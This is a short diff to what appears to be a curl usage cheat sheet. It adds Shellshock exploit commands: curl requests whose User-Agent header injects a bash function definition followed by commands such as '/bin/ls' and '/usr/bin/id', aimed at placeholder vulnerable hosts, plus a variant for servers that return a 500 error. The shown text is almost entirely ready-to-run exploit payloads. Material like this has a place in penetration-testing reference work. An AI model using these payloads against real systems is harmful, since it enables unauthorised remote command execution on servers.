@@ -396,8 +396,15 @@ curl http://www.foo.com 2>/dev/null \
 ```
 
 - Shellshock
+
+Basic usage:
 ```
 curl -H "User-Agent: () { :; }; /bin/ls" http://vulnerablesitegoeshere.net/
+```
+
+If you get a 500 error:
+```
+curl -H "User-Agent: () { :; }; echo Content-Type: text/html; echo; /usr/bin/id" http://vulnerableurlhere.net
 ```
 
 - As a portscanner
